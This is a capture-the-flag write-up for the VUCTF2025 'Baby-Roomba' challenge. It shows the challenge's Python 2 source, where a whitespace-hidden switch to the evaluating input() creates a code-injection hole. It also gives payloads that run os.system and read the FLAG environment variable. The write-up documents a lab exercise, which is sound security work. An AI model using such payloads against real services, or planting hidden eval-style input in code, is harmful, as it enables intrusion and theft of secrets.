# VUCTF2025 Baby-Roomba

In this misc challenge we are given the ip of a roomba c&c server, as well as the source code. The description also reveals the flag will be stored in the `FLAG` environment variable.

When connecting to the ip, we are greeted with the following interface:

```
$ nc master-roomba.studsec.nl 4004
--------------------------------------------------------------------------------
|                         Welcome to Baby Roomba C&C!                          |
|                            "They shall grow old."                            |
--------------------------------------------------------------------------------

>>>
```

The source code reveals that this interface allows us to send certain commands, with the command `exec` sounding particularly interesting:
```
from __future__ import print_function
from random import randint    ; input = raw_input

print("".ljust(80, "-"))
print("|" + "Welcome to Baby Roomba C&C!".center(78) + "|")
print("|" + '"They shall grow old."'.center(78) + "|")
print("".ljust(80, "-"))
print("")

cmd = "1337"
while cmd != "exit":
    try:
        cmd = input(">>> ")

        if cmd == "exit":
            print("Goodbye!")
        elif cmd == "count":
            print("{0} baby roombas being trained!".format(randint(50, 5000)))
        elif cmd[:4] == "exec":
            print("Executing command: {0}".format(cmd))
            # TODO: implement the actual C&C code to the babies..
            raise NotImplementedError("C&C exec")
        elif cmd == "help":
            print("Commands: exit, count, exec, help")
        else:
            print("Invalid command. Type 'help' for a list")
    except NotImplementedError:
        print("C&C faced exception, going into fail mode!") ; input = __builtins__.input
    except:
        cmd = "exit"

```
Note that the statements `; input = raw_input` and `; input = __builtins__.input` were somewhat hidden in the file. There were tons of spaces before the `;`'s, causing the code to be out of view when opened in an IDE. I removed the spaces here for readability.
The code itself does not immediately show a clear path to gain command execution using the `exec` command, as this code path is not implemented in the challenge. However, the `NotImplementedError` does change the `input()` function used, which could be interesting.
I was unsure what the differences were between `raw_input` and `__builtins__.input`, so I did some research. I found a [StackOverflow post](https://stackoverflow.com/questions/7709022/is-it-ever-useful-to-use-pythons-input-over-raw-input), which describes that `__builtins__.input` in Python 2 evaluates input as code, and `raw_input` should be used instead.
Taking a look in the provided `Dockerfile`, we can see that this does indeed run on Python 2:
```
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update && \
    apt-get install -y python2 socat && \
    ln -s /usr/bin/python2 /usr/bin/python
```
So, how can we exploit it? I found the following [article](https://github.com/3ls3if/Cybersecurity-Notes/blob/main/real-world-and-and-ctf/scripts-and-systems/python2-input-vulnerability.md), which contains an example payload:
```
__import__("os").system("uname -a")
```
We can alter this to instead print out the `FLAG` environment variable as follows:
```
print(__import__('os').environ['FLAG'])
```
Then in the final attack, we first use the `exec` command to switch to the unsafe `input()` function with the `NotImplementedError` exception, after which we can send our payload:
```
$ nc master-roomba.studsec.nl 4004
--------------------------------------------------------------------------------
|                         Welcome to Baby Roomba C&C!                          |
|                            "They shall grow old."                            |
--------------------------------------------------------------------------------

>>> exec
exec
Executing command: exec
C&C faced exception, going into fail mode!
>>> print(__import__('os').environ['FLAG'])
print(__import__('os').environ['FLAG'])
VUCTF{REDACTED}
```
